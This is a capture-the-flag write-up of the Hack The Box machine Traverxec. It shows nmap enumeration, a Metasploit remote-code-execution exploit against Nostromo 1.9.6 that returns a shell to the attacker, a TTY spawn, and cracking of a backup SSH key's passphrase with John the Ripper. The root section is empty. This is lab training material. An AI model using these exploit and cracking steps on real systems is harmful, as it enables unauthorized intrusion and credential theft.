# Hack The Box - Traverxec - Writeup by <a href="https://montyshyama.me/">Monty Shyama</a>

<p align="center">
  <img src="screenshots/1.png" width="738">
</p>

# Enumeration

Run a Full Nmap Scan to find all the open ports & the services associated with them.

```
#!/bin/bash
echo Grabbing ports...
ports=$(nmap -p- --min-rate 1000 -T4 $1 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)  
echo Ports grabbed!
echo Scanning...
nmap -sC -sV -Pn -p $ports $1 $2 $3
```

<p align="center">
  <img src="screenshots/3.png" width="738">
</p>

Port 80 contains a webpage. A usual Directory brute-forcing on the page shows nothing interesting to work upon.

<p align="center">
  <img src="screenshots/4.png" width="738">
</p>

The Nmap scan also reveals that it is running Nostromo Web Server (Version: 1.9.6). 
This version contains Directory Traversal Remote Command Execution Vulnerability.

# Initial Foothold

Lets use Metasploit module to exploit <a href="https://www.rapid7.com/db/modules/exploit/multi/http/nostromo_code_exec">this</a> vulnerability.
Start the PostgreSQL database & the Metasploit using this command:

```
msfdb run
```

<p align="center">
  <img src="screenshots/5.png" width="738">
</p>

Configure the exploit and run it. It will return a Command Shell.

```
use exploit/multi/http/nostromo_code_exec
set rhosts 10.10.10.165
set lhost tun0
run
```

<p align="center">
  <img src="screenshots/6.png" width="738">
</p>

Use the following Python one-liner to spawn to a TTY shell.

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

And, we are on the box!

# Privilege Escalation

While on the box, we found 'backup-ssh-identity-files' in the following directory:

```
/home/david/public_www/protected-file-area
```

<p align="center">
  <img src="screenshots/10.png" width="738">
</p>

It contains a Backup SSH Private Key. To list out the contents of this file, use the following command:

```
zcat backup-ssh-identity-files.tgz
```

<p align="center">
  <img src="screenshots/11.png" width="738">
</p>

Save this key on the local machine and try to brute-force it to find a possible candidate for the passphrase. Use the following commands:

```
./ssh2john.py id_rsa > id_rsa.hashes
john -w /usr/share/wordlists/rockyou.txt --format=SSH id_rsa.hashes
john --show id_rsa.hashes
```

<p align="center">
  <img src="screenshots/12.png" width="738">
</p>

The Passphrase found is ```hunter```. Lets use this SSH Private Key to login into the machine as User ```david```

<p align="center">
  <img src="screenshots/13.png" width="738">
</p>

And,finally the User FLag is retrieved.

<p align="center">
  <img src="screenshots/14.png" width="738">
</p>

# Getting a Root Shell






